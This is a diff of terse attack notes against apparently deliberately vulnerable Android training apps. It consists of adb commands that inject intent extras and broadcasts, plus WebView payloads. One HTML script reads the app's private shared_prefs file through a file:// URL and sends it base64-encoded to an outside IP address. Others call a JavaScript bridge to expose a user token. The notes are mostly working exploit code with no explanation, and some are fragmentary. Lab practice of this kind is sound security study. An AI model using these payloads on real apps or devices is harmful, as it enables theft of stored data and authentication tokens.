@@ -1,2 +1,45 @@
-adb shell am start -n com.example.intentinjection/com.example.intentinjection.Dashboard -e username 'hacker'
+adb shell am start -n com.example.intentinjection/.Dashboard -e username 'hacker'
 adb shell am broadcast -p com.example.insecurebroadcastreceiver -a theBroadcast -e mobile '000' -e password "123456"
+
+adb shell am start -n com.example.insecurewebview/.RegistrationWebView -e reg_url 'http://138.68.182.36:999/'
+
+
+save test.html 
+<script>
+    var url = 'file:///data/data/com.example.insecurewebview/shared_prefs/MainActivity.xml'; 
+function load(url) {
+        var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                fetch('http://138.68.182.36:999/?data=' + btoa(xhr.responseText));
+            }
+        }
+xhr.open('GET', url, true);
+        xhr.send('');
+    }
+load(url)
+</script>
+
+
+adb push test.html /mnt/sdcard/test.html
+adb shell am start -n com.example.insecurewebview/.RegistrationWebView --es reg_url "file:///mnt/sdcard/test.html"
+
+
+
+
+
+tes2.html
+
+<script type="text/javascript">
+alert("token: " + Android.getUserToken());
+</script>
+
+save 
+
+
+adb shell am start -n com.example.insecurewebview/.SupportWebView -e support_url 'http://138.68.182.36:999/test2.html'
+adb shell am start -n com.example.insecurewebview/.SupportWebView --es support_url "file:///mnt/sdcard/test2.html"
+
+<script type="text/javascript">
+alert("token: " + Android.getUserToken());
+</script>
